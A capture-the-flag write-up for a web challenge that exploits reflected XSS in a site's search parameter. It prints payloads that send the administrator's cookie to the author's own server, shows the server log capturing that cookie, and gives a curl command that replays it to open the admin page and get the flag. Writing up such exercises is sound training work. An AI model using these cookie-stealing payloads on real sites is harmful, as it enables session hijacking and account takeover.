# Info

The challenge brings us back to a site.
Let's try a little ...
Ok, when we do a search, the search is rewritten in the html code. So let's try an xss payload just to try it out.

OK! It is therefore an xss flaw.

Let's exploit.

The objective is to redirect the administrator, (who will click on our link that we will send him in the support section), to our own server using an html request and who will give us his cookie. Once his cookie has been recovered, we can pretend to be him and then connect to the admin area (see the cURL part) 

(Below some tests until my good one) 


# Payload XSS for the PoC:
https://searchme.0xhorizon.eu/?search=%22%3Cimg%20src=x%20onerror=%27alert(1)%27%3E%22


# Payload to redirect:
### Doesn't work --> probably cause of " which break the payload
`https://searchme.0xhorizon.eu/?search="<img src=x onerror='document.location="http://ip_of_my_aws_server:8888?hello="+document.cookie'>"`

`https://searchme.0xhorizon.eu/?search="<img src=x onerror='window.location="http://ip_of_my_aws_server:8888?hello="+document.cookie'>"`

### trying to correct it, BUT we can't add something
`https://searchme.0xhorizon.eu/?search="<img src=x onerror='alert(document.location="http://ip_of_my_aws_server:8888?hello="+document.cookie)'>"`

# Good Payload

In fact, we just needed to .concat instead of adding.

`https://searchme.0xhorizon.eu/?search="<img src=x onerror='alert(document.location="http://ip_of_my_aws_server:8888?hello=".concat(document.cookie))'>"`

# Response

151.80.56.168 - - [04/Nov/2021 21:00:43] "GET /?hello=login=999eb32cea9627e00939b81766f00694 HTTP/1.1" 200 -

So we get the cookie : login=999eb32cea9627e00939b81766f00694

# Let's play cURL

`curl -H "Cookie: login=999eb32cea9627e00939b81766f00694" https://searchme.0xhorizon.eu/admin.php | grep 'horiz0nx'`    

    % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
    Dload  Upload   Total   Spent    Left  Speed
    100  2045  100  2045    0     0  30984      0 --:--:-- --:--:-- --:--:-- 30984
         
    <p class="card-text">My coffee machine: horiz0nx{C00ffee__m@ch1ne__1s__y0ur_n0w}</p>
 
## Gotcha !

horiz0nx{C00ffee__m@ch1ne__1s__y0ur_n0w}
